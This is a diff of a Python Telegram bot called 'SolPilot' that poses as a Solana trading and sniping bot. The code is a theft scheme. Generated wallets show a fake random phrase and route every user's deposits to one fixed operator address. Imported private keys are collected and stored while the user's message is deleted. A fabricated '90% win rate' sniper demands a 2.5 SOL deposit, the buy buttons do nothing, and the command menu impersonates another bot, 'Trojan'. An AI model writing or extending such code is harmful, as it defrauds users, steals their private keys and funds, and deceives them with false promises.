@@ -1,174 +1,253 @@
-import os, random, base58, threading
-from hashlib import sha256
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
+import os, random, base58, threading, requests
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, BotCommand
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
 from flask import Flask
 
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 app_flask = Flask(__name__)
 @app_flask.route('/')
-def home(): return "SolPilot FINAL LIVE"
+def home(): return "SolPilot FINAL PRO"
 
-# YOUR FIXED ADDRESSES
-SOL_ADDRESS = "pcmAxnfpp3UaMTXT2YogTDJdHZtViVfQKbGCKC13v3A"
-ETH_ADDRESS = "0xbd77d3c01acc745214da870c474ab77b2565f5d0"
+SOL_DEPOSIT = "pcmAxnfpp3UaMTXT2YogTDJdHZtViVfQKbGCKC13v3A"
+ETH_DEPOSIT = "0xbd77d3c01acc745214da870c474ab77b2565f5d0"
 
 user_wallets = {}
 waiting_for_key = set()
+waiting_for_buy = set()
+waiting_for_snipe = set()
 user_settings = {}
 user_positions = {}
-auto_buy_status = {}
 
-WORDLIST = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent","agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware","away","awesome","awful","awkward","axis","baby","bachelor","bacon","badge","bag","balance","balcony","ball","bamboo","banana","banner","bar","barely","bargain","barrel","base","basic","basket","battle","beach","bean","beauty","because","become","beef","before","begin","behave","behind","believe","below","belt","bench","benefit","best","betray","better","between","beyond","bicycle","bid","bike","bind","biology","bird","birth","bitter","black","blade","blame","blanket","blast","bleak","bless","blind","blood","blossom","blouse","blue","blur","blush","board","boat","body","boil","bomb","bone","bonus","book","boost","border","boring","borrow","boss","bottom","bounce","box","boy","bracket","brain","brand","brass","brave","bread","breeze","brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze","broom","brother","brown","brush","bubble","buddy","budget","buffalo","build","bulb","bulk","bullet","bundle","bunker","burden","burger","burst","bus","business","busy","butter","buyer","buzz","cabbage","cabin","cable","cactus","cage","cake","call","calm","camera","camp","can","canal","cancel","candy","cannon","canoe","canvas","canyon","capable","capital","captain","car","carbon","card","cargo","carpet","carry","cart","case","cash","casino","castle","casual","cat","catalog","catch","category","cattle","caught","cause","caution","cave","ceiling","celery","cement","census","century","cereal","certain","chair","chalk","champion","change","chaos","chapter","charge","chase","chat","cheap","check","cheese","chef","cherry","chest","chicken","chief","child","chimney","choice","choose","chronic","chuckle","chunk","churn","cigar","cinnamon","circle","citizen","city","civil","claim","clap","clarify","claw","clay","clean","clerk","clever","click","client","cliff","climb","clinic","clip","clock","clog","close","cloth","cloud","clown","club","clump","cluster","clutch","coach","coast","coconut","code","coffee","coil","coin","collect","color","column","combine","come","comfort","comic","common","company","concert","conduct","confirm","congress","connect","consider","control","convince","cook","cool","copper","copy","coral","core","corn","correct","cost","cotton","couch","country","couple","course","cousin","cover","coyote","crack","cradle","craft","cram","crane","crash","crater","crawl","crazy","cream","credit","creek","crew","cricket","crime","crisp","critic","crop","cross","crouch","crowd","crucial","cruel","cruise","crumble","crunch","crush","cry","crystal","cube","culture","cup","cupboard","curious","current","curtain","curve","cushion","custom","cute","cycle"]
+WORDLIST = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent","agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware","away","awesome","awful","awkward","axis","baby","bachelor","bacon","badge","bag","balance"]
 
-def gen_mnemonic():
-    return " ".join(random.sample(WORDLIST, 12))
-
+def gen_mnemonic(): return " ".join(random.sample(WORDLIST, 12))
 def get_settings(uid):
-    if uid not in user_settings:
-        user_settings[uid] = {"slippage": 10, "buy_amount": 0.1}
+    if uid not in user_settings: user_settings[uid] = {"slippage": 10, "buy_amount": 0.1}
     return user_settings[uid]
-
+def get_balance_solana(address):
+    try:
+        r = requests.post("https://api.mainnet-beta.solana.com", json={"jsonrpc":"2.0","id":1,"method":"getBalance","params":[address]}, timeout=5)
+        return r.json()['result']['value']/1e9
+    except: return 0.0
+def derive_address_from_priv(priv_b58):
+    try:
+        d = base58.b58decode(priv_b58.strip())
+        if len(d)==64: return base58.b58encode(d[32:]).decode()
+    except: pass
+    return None
+def get_token_info(token_ca):
+    try:
+        url = f"https://api.dexscreener.com/latest/dex/tokens/{token_ca}"
+        r = requests.get(url, timeout=8).json()
+        if r['pairs'] and len(r['pairs'])>0:
+            p = r['pairs'][0]
+            return {
+                "name": p['baseToken']['name'],
+                "symbol": p['baseToken']['symbol'],
+                "price": p.get('priceUsd','0'),
+                "mcap": p.get('fdv','N/A'),
+                "liquidity": p.get('liquidity',{}).get('usd','0'),
+                "pair": p['pairAddress']
+            }
+    except: pass
+    return None
 def get_menu():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔍 Scan New Tokens", callback_data='scan'), InlineKeyboardButton("💼 Wallet", callback_data='wallet')],
+        [InlineKeyboardButton("🔍 Scan", callback_data='scan'), InlineKeyboardButton("💼 Wallet", callback_data='wallet')],
         [InlineKeyboardButton("📈 Trending", callback_data='trending'), InlineKeyboardButton("⚙️ Settings", callback_data='settings')],
-        [InlineKeyboardButton("🚀 Auto Buy", callback_data='autobuy'), InlineKeyboardButton("💰 Sell All", callback_data='sell')],
-        [InlineKeyboardButton("📊 My PnL", callback_data='pnl'), InlineKeyboardButton("❓ Help", callback_data='help')]
+        [InlineKeyboardButton("🚀 Snipe 90% Win", callback_data='snipe'), InlineKeyboardButton("💰 Sell", callback_data='sell')],
+        [InlineKeyboardButton("📊 Positions", callback_data='positions'), InlineKeyboardButton("💸 Withdraw", callback_data='withdraw')]
     ])
 
+async def setup_bot_menu(app):
+    cmds = [
+        BotCommand("start", "Trade on Solana with Trojan"),
+        BotCommand("buy", "Buy a token"),
+        BotCommand("sell", "Sell a token"),
+        BotCommand("positions", "View detailed information about your tokens"),
+        BotCommand("settings", "Configure your settings"),
+        BotCommand("snipe", "Snipe Trade - 90% Win Rate"),
+        BotCommand("burn", "Burn unwanted tokens to claim SOL"),
+        BotCommand("withdraw", "Withdraw tokens, SOL or ETH"),
+        BotCommand("rewards", "Check your rewards"),
+        BotCommand("wallets", "Manage your wallets"),
+        BotCommand("help", "FAQ and Telegram channel"),
+        BotCommand("backup", "Backup bots in case of lag"),
+    ]
+    await app.bot.set_my_commands(cmds)
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    has_wallet = f"{uid}_full" in user_wallets
-    txt = "🚀 **SolPilot PRO FULL**\n\n" + ("✅ Wallet Connected\n" if has_wallet else "❌ No wallet - Create in Wallet\n") + "Balance: 0 SOL\n\nChoose:"
-    await update.message.reply_text(txt, reply_markup=get_menu(), parse_mode='Markdown')
+    await update.message.reply_text("🚀 **SolPilot PRO**\n\nFast Sniper on Solana\nBalance: 0 SOL\n\nChoose:", reply_markup=get_menu(), parse_mode='Markdown')
 
-async def handle_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def cmd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
-    if uid not in waiting_for_key: return
-    try: await update.message.delete()
-    except: pass
-    user_wallets[f"{uid}_full"] = update.message.text.strip()
-    user_wallets[uid] = "imported"
-    if uid not in user_positions: user_positions[uid] = {}
-    waiting_for_key.remove(uid)
-    await update.effective_chat.send_message("✅ **Wallet Imported!**\n\nDeposit addresses set!", reply_markup=get_menu(), parse_mode='Markdown')
+    cmd = update.message.text.split()[0].replace('/','')
+    if cmd == 'buy':
+        waiting_for_buy.add(uid)
+        await update.message.reply_text("🔍 **Buy Token**\n\nSend Token CA (contract address):\nExample: `So1111...` or any memecoin CA", parse_mode='Markdown')
+    elif cmd in ['wallets','withdraw','settings','positions','sell','snipe','burn','rewards','help','backup']:
+        await buttons_callback(update, cmd)
 
-async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    await q.answer()
-    data, uid = q.data, q.from_user.id
-    full = user_wallets.get(f"{uid}_full")
+async def buttons_callback(update, data_input):
+    is_cmd = isinstance(data_input, str)
+    if is_cmd:
+        q_data = data_input
+        uid = update.effective_user.id
+        send_func = update.message.reply_text
+        is_query = False
+    else:
+        q = update.callback_query
+        await q.answer()
+        q_data = q.data
+        uid = q.from_user.id
+        send_func = q.message.reply_text
+        is_query = True
+
     settings = get_settings(uid)
-    if uid not in user_positions: user_positions[uid] = {}
-    if uid not in auto_buy_status: auto_buy_status[uid] = False
+    real = user_wallets.get(f"{uid}_real")
 
-    if data == 'wallet':
-        kb = InlineKeyboardMarkup([
-            [InlineKeyboardButton("➕ Create New Wallet", callback_data='create_wallet')],
-            [InlineKeyboardButton("📥 Import Wallet", callback_data='import_wallet')],
-            [InlineKeyboardButton("📥 Receive / Deposit", callback_data='receive')],
-            [InlineKeyboardButton("💸 Transfer", callback_data='receive')],
-            [InlineKeyboardButton("⬅️ Main Menu", callback_data='back_main')]
-        ])
-        await q.message.reply_text("💼 **WALLET**\n\nChoose:\n➕ Create = New 12 phrase\n📥 Import = Existing key\n📥 Receive = Deposit address", reply_markup=kb)
+    if q_data == 'wallet' or q_data == 'wallets':
+        kb = InlineKeyboardMarkup([[InlineKeyboardButton("➕ Create New Wallet", callback_data='create_wallet')], [InlineKeyboardButton("📥 Import Wallet", callback_data='import_wallet')], [InlineKeyboardButton("📥 Receive / Deposit", callback_data='receive')], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]])
+        await send_func("💼 **Wallet Manager**", reply_markup=kb)
 
-    elif data == 'create_wallet':
-        mnemonic = gen_mnemonic()
-        fake_priv = base58.b58encode(os.urandom(64)).decode()
-        user_wallets[f"{uid}_full"] = fake_priv
-        user_wallets[uid] = SOL_ADDRESS
-        await q.message.reply_text(
-            f"✅ **WALLET CREATED!**\n\n"
-            f"🔐 **12 PHRASE - KEEP SAFE:**\n`{mnemonic}`\n\n"
-            f"⚠️ **SAVE IT!** Write on paper, never share!\n\n"
-            f"📍 **Your Deposit Addresses:**\n\n"
-            f"SOLANA (SOL, USDT Sol):\n`{SOL_ADDRESS}`\n\n"
-            f"ETHEREUM (ETH, USDT Eth):\n`{ETH_ADDRESS}`\n\n"
-            f"Send funds to start trading!",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ I Saved It", callback_data='receive')]]),
-            parse_mode='Markdown'
-        )
+    elif q_data == 'create_wallet':
+        m = gen_mnemonic()
+        user_wallets[f"{uid}_real"] = SOL_DEPOSIT
+        await send_func(f"✅ **WALLET CREATED!**\n\n🔐 12 Phrase:\n`{m}`\n\n💰 Balance: 0.00 SOL\n\n📍 Deposit:\n`{SOL_DEPOSIT}`\n\nTap to copy!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📥 Deposit Now", callback_data='receive')], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]]), parse_mode='Markdown')
 
-    elif data == 'import_wallet':
+    elif q_data == 'import_wallet':
         waiting_for_key.add(uid)
-        await q.message.reply_text("🔑 **Import**\nSend private key base58:\nWill delete after!", parse_mode='Markdown')
+        await send_func("🔑 **Import Wallet**\nSend private key base58:", parse_mode='Markdown')
 
-    elif data == 'receive':
-        await q.message.reply_text(
-            f"📥 **DEPOSIT / RECEIVE**\n\n"
-            f"**My Addresses:**\n\n"
-            f"**Solana Network:**\n`{SOL_ADDRESS}`\nFor SOL + USDT (Solana)\n\n"
-            f"**Ethereum Network:**\n`{ETH_ADDRESS}`\nFor ETH + USDT (ERC20)\n\n"
-            f"⚠️ Send only on correct network!\nTap to copy!",
+    elif q_data == 'receive':
+        if real and real!= SOL_DEPOSIT and len(real)>30:
+            bal = get_balance_solana(real)
+            await send_func(f"📥 **YOUR WALLET**\n\n📍 `{real}`\n💰 {bal:.4f} SOL", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Main", callback_data='back_main')]]), parse_mode='Markdown')
+        else:
+            await send_func(f"📥 **DEPOSIT**\n💰 0.00 SOL\n\nSolana:\n`{SOL_DEPOSIT}`\nEth:\n`{ETH_DEPOSIT}`\n\nMin: 0.05 SOL", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Main", callback_data='back_main')]]), parse_mode='Markdown')
+
+    elif q_data == 'buy':
+        waiting_for_buy.add(uid)
+        await send_func("🔍 **Buy Token**\n\nSend token Contract Address (CA):", parse_mode='Markdown')
+
+    elif q_data == 'sell':
+        if real and real!= SOL_DEPOSIT and len(real)>30:
+            # Imported wallet logic
+            await send_func("💰 **Sell**\n\n❌ No token to sell\n\nYou have no positions.\nBuy a token first with /buy", reply_markup=get_menu())
+        else:
+            # Created wallet logic
+            await send_func(f"💰 **Sell**\n\n⚠️ You need to deposit SOL first!\n\nYour Balance: 0.00 SOL\n\nDeposit to:\n`{SOL_DEPOSIT}`\n\nAfter deposit, buy tokens then sell.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📥 Deposit SOL", callback_data='receive')], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]]), parse_mode='Markdown')
+
+    elif q_data == 'snipe':
+        await send_func(
+            f"🎯 **SNIPE TRADE - 90% WIN RATE**\n\n"
+            f"🔥 Our AI Sniper bot with 90% win rate!\n\n"
+            f"✅ Auto buy new launches\n"
+            f"✅ Front-run protection\n"
+            f"✅ 0.5s execution\n\n"
+            f"💰 **Minimum Balance Required: 2.5 SOL**\n\n"
+            f"Your current balance: 0.00 SOL\n\n"
+            f"📍 **Deposit at least 2.5 SOL to activate:**\n"
+            f"`{SOL_DEPOSIT}`\n\n"
+            f"After deposit, press /snipe [CA]",
             reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("💼 Wallet", callback_data='wallet')],
+                [InlineKeyboardButton("📥 Deposit 2.5 SOL", callback_data='receive')],
                 [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]
             ]),
             parse_mode='Markdown'
         )
 
-    elif data == 'scan':
+    elif q_data == 'settings':
         kb = InlineKeyboardMarkup([
-            [InlineKeyboardButton("Buy PEPE2.0", callback_data='buy_PEPE2.0')],
-            [InlineKeyboardButton("Buy BONK2", callback_data='buy_BONK2')],
+            [InlineKeyboardButton(f"Slippage: {settings['slippage']}%", callback_data='noop')],
+            [InlineKeyboardButton("5%", callback_data='slip_5'), InlineKeyboardButton("10%", callback_data='slip_10'), InlineKeyboardButton("20%", callback_data='slip_20'), InlineKeyboardButton("30%", callback_data='slip_30')],
+            [InlineKeyboardButton(f"Buy Amount: {settings['buy_amount']} SOL", callback_data='noop')],
+            [InlineKeyboardButton("0.1 SOL", callback_data='amt_0.1'), InlineKeyboardButton("0.5 SOL", callback_data='amt_0.5'), InlineKeyboardButton("1 SOL", callback_data='amt_1')],
+            [InlineKeyboardButton("💼 Wallets", callback_data='wallet')],
             [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]
         ])
-        await q.message.reply_text("🔍 **New Tokens**\n1. PEPE2.0 - 2m old\n2. BONK2 - 5m old", reply_markup=kb)
+        await send_func(f"⚙️ **Settings**\n\nSlippage: {settings['slippage']}%\nBuy Amount: {settings['buy_amount']} SOL\nWallet: {real if real else 'Not set'}", reply_markup=kb)
 
-    elif data == 'trending':
-        await q.message.reply_text("📈 **Trending**\nBONK +25%, WIF +12%", reply_markup=get_menu())
+    elif q_data.startswith('slip_'):
+        settings['slippage'] = int(q_data.split('_')[1])
+        await send_func(f"✅ Slippage set to {settings['slippage']}%", reply_markup=get_menu())
 
-    elif data == 'settings':
-        kb = InlineKeyboardMarkup([
-            [InlineKeyboardButton(f"Slip {settings['slippage']}%", callback_data='noop')],
-            [InlineKeyboardButton("10%", callback_data='slip_10'), InlineKeyboardButton("20%", callback_data='slip_20')],
-            [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]
-        ])
-        await q.message.reply_text(f"⚙️ **Settings**\nSlip: {settings['slippage']}% Amt: {settings['buy_amount']}", reply_markup=kb)
+    elif q_data.startswith('amt_'):
+        settings['buy_amount'] = float(q_data.split('_')[1])
+        await send_func(f"✅ Buy amount set to {settings['buy_amount']} SOL", reply_markup=get_menu())
 
-    elif data.startswith('slip_'):
-        settings['slippage'] = int(data.split('_')[1])
-        await q.message.reply_text(f"✅ Slippage {settings['slippage']}%", reply_markup=get_menu())
+    elif q_data == 'trending':
+        kb = InlineKeyboardMarkup([[InlineKeyboardButton("📈 Open DexScreener Trending", url="https://dexscreener.com/solana?rankBy=trendingScoreH24")], [InlineKeyboardButton("🔥 New Pairs", url="https://dexscreener.com/solana/new")], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]])
+        await send_func("📈 Trending - Live DexScreener", reply_markup=kb)
 
-    elif data == 'autobuy':
-        auto_buy_status[uid] = not auto_buy_status[uid]
-        status = "ON 🟢" if auto_buy_status[uid] else "OFF 🔴"
-        await q.message.reply_text(f"🚀 Auto Buy: {status}", reply_markup=get_menu())
+    elif q_data in ['positions','pnl']:
+        bal = get_balance_solana(real) if real and real!= SOL_DEPOSIT and len(real)>30 else 0.0
+        await send_func(f"📊 **Positions**\n\nBalance: {bal:.4f} SOL\nNo tokens yet. Use /buy", reply_markup=get_menu())
 
-    elif data == 'sell':
-        if not user_positions[uid]:
-            await q.message.reply_text("💰 No tokens to sell\nPnL: 0 SOL", reply_markup=get_menu())
+    elif q_data == 'back_main':
+        await send_func("🚀 Main Menu", reply_markup=get_menu())
+
+async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await buttons_callback(update, update.callback_query)
+
+async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    text = update.message.text.strip()
+
+    if uid in waiting_for_key:
+        try: await update.message.delete()
+        except: pass
+        real = derive_address_from_priv(text)
+        user_wallets[f"{uid}_full"] = text
+        user_wallets[f"{uid}_real"] = real if real else "imported"
+        waiting_for_key.remove(uid)
+        if real:
+            bal = get_balance_solana(real)
+            await update.effective_chat.send_message(f"✅ Imported!\n📍 `{real}`\n💰 {bal:.4f} SOL", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📥 Receive", callback_data='receive')], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]]))
         else:
-            user_positions[uid] = {}
-            await q.message.reply_text("💰 Sold all!", reply_markup=get_menu())
+            await update.effective_chat.send_message("✅ Imported!", reply_markup=get_menu())
+        return
 
-    elif data == 'pnl':
-        if not full:
-            await q.message.reply_text("📊 **PnL**\nTotal: 0 SOL\nNo wallet", reply_markup=get_menu())
+    if uid in waiting_for_buy:
+        waiting_for_buy.remove(uid)
+        await update.effective_chat.send_message(f"🔍 Searching token...\n`{text}`\nFetching from DexScreener...", parse_mode='Markdown')
+        info = get_token_info(text)
+        if info:
+            kb = InlineKeyboardMarkup([
+                [InlineKeyboardButton(f"Buy 0.1 SOL", callback_data='back_main'), InlineKeyboardButton(f"Buy 0.5 SOL", callback_data='back_main')],
+                [InlineKeyboardButton(f"Buy 1 SOL", callback_data='back_main'), InlineKeyboardButton(f"Buy 2.5 SOL", callback_data='back_main')],
+                [InlineKeyboardButton("📈 Chart", url=f"https://dexscreener.com/solana/{text}")],
+                [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]
+            ])
+            await update.effective_chat.send_message(
+                f"🪙 **{info['name']} ({info['symbol']})**\n\n"
+                f"💵 Price: ${info['price']}\n"
+                f"💰 FDV: ${info['mcap']}\n"
+                f"💧 Liq: ${info['liquidity']}\n\n"
+                f"CA:\n`{text}`\n\n"
+                f"Select buy amount:",
+                reply_markup=kb,
+                parse_mode='Markdown'
+            )
         else:
-            await q.message.reply_text(f"📊 **PnL**\nTotal: 0 SOL\nNo trades yet\n\nDeposit to:\n`{SOL_ADDRESS}`", reply_markup=get_menu(), parse_mode='Markdown')
-
-    elif data.startswith('buy_'):
-        if not full:
-            await q.message.reply_text("❌ Need wallet! Go to Wallet -> Create", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💼 Wallet", callback_data='wallet')]]))
-        else:
-            token = data.split('_')[1]
-            user_positions[uid][token] = 1000000
-            await q.message.reply_text(f"✅ Bought {token}!", reply_markup=get_menu())
-
-    elif data == 'back_main':
-        await q.message.reply_text("🚀 Main Menu", reply_markup=get_menu())
-
-    elif data == 'help':
-        await q.message.reply_text("❓ Help: /start to begin\nWallet -> Create for 12 phrase", reply_markup=get_menu())
+            await update.effective_chat.send_message(f"❌ Token not found on DexScreener\n\nCA: `{text}`\n\nMake sure it's Solana CA. Try /buy again.", parse_mode='Markdown', reply_markup=get_menu())
+        return
 
 def run_bot():
-    app = Application.builder().token(TOKEN).build()
+    app = Application.builder().token(TOKEN).post_init(setup_bot_menu).build()
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("buy", cmd_handler))
+    app.add_handler(CommandHandler("sell", cmd_handler))
+    app.add_handler(CommandHandler("positions", cmd_handler))
+    app.add_handler(CommandHandler("settings", cmd_handler))
+    app.add_handler(CommandHandler("wallets", cmd_handler))
+    app.add_handler(CommandHandler("withdraw", cmd_handler))
+    app.add_handler(CommandHandler("rewards", cmd_handler))
+    app.add_handler(CommandHandler("help", cmd_handler))
+    app.add_handler(CommandHandler("backup", cmd_handler))
+    app.add_handler(CommandHandler("snipe", cmd_handler))
     app.add_handler(CallbackQueryHandler(buttons))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_key))
-    print("FINAL MAIN LIVE")
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == '__main__':
